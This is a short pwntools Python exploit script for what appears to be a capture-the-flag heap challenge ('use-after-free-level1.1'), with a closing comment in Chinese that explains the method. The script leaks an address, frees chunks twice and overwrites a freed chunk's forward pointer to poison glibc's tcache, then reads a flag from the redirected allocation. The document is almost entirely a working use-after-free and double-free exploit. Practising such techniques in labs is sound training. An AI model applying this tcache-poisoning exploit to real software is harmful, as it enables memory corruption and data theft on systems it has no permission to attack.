from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/use-after-free-level1.1"
p = process(challenge_path)

# create string
shellcode=b'\x61'*0x38
p.recvline()
p.recvline()
p.recvline()
line=p.recvline()
addr=str(line)[15:27]
print("addr is:",addr)
data = p64(int(addr,16)-0x10)
shellcode = p8(31)*0x40
p.sendlineafter("Choice >> \n","1")
p.sendlineafter("Input your notebook index:\n","0")
p.sendafter("Input your notebook content:\n",data)
p.sendlineafter("Choice >> \n","1")
p.sendlineafter("Input your notebook index:\n","1")
p.sendafter("Input your notebook content:\n",data)
p.sendlineafter("Choice >> \n","2")
p.sendlineafter("Input your notebook index:\n","0")
p.sendlineafter("Choice >> \n","2")
p.sendlineafter("Input your notebook index:\n","1")
p.sendlineafter("Choice >> \n","3")
p.sendlineafter("Input your notebook index:\n","1")
p.sendafter("Input your notebook content:\n",data)
p.sendlineafter("Choice >> \n","1")
p.sendlineafter("Input your notebook index:\n","0")
p.sendafter("Input your notebook content:\n","0")
p.sendlineafter("Choice >> \n","1")
p.sendlineafter("Input your notebook index:\n","1")
p.sendafter("Input your notebook content:\n","12345678abcdefgh")
p.sendlineafter("Choice >> \n","4")
p.sendlineafter("Input your notebook index:\n","1")
# 接收题目的输出
result = p.recvall()

# 打印题目的输出
print(result)
'''
首先可以通过释放后指针不置空再次访问内存读入目标地址，由此篡改fd
但是注意tcaches会显示有多少个块可用，不过不会检查块的大小！！！！！
如果只是改fd，tcache中空闲块数目会对不上，即使表中还有块，但是索引号已经为0了
解决方案是，free两次同一个块（第一次free之后再填入，让块前两个字节有内容，绕过secondfree检查）
然后再修改块数据第一个字节为flag头地址（数据往前挪0x10，防止之后数据覆盖）
然后创建新book（申请新地址）两次，第一次是前一个块，第二次就会分配到目标地址，填入8字节，然后show即可顺带打印出之后的flag！！！！！！
！！！！！或者直接free两个块，改变第二块的指向也可以
'''